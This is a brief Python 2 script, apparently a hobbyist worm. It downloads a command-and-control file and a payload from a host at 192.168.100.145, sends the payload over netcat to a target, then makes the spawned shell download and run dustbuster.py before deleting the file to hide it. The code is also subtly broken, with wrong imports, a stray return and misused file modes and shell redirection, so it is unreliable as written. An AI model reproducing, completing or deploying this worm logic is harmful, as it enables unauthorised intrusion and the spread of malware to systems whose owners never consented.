#!/usr/bin/env python2
import sleep
import os
import subprocess as sp

# check for previous infection
if os.path.exists('/tmp/barglefish.notaworm'):
	return

# place marker before working
with open('/tmp/barglefish.notaworm') as marker:
	marker.write('nothing here...')

# download CC file and payload
sp.call(['curl', 'http://192.168.100.145/WORMS/cc.txt',  '>', '/tmp/cc.notaworm'],     shell=True)
sp.call(['curl', 'http://192.168.100.145/WORMS/ppacket', '>', '/tmp/poison.notaworm'], shell=True)

cc, poison = None, None
with open('/tmp/cc.notaworm') as cc_file:
	cc = cc_file.readlines()

with open('/tmp/poison.notaworm') as poison_file:
	poison = poison_file.read()

# parse CC file

# run payload packet through netcat, then wait a little for it to be processed
nc = sp.Popen(['nc', 'IPADDRESS', '77'], stdin=sp.PIPE, stdout=sp.PIPE)
nc.stdin.write(poison)
nc.stdin.flush()
time.sleep(3)

# tell spawned shell to download the python script and run it
nc.stdin.write('curl http://192.168.100.145/WORMS/dustbuster.py > /tmp/dustbuster.py && nohup python2 /tmp/dustbuster.py &\n')
nc.stdin.flush()

# erase itself
os.remove('/tmp/dustbuster.py')

# screw around
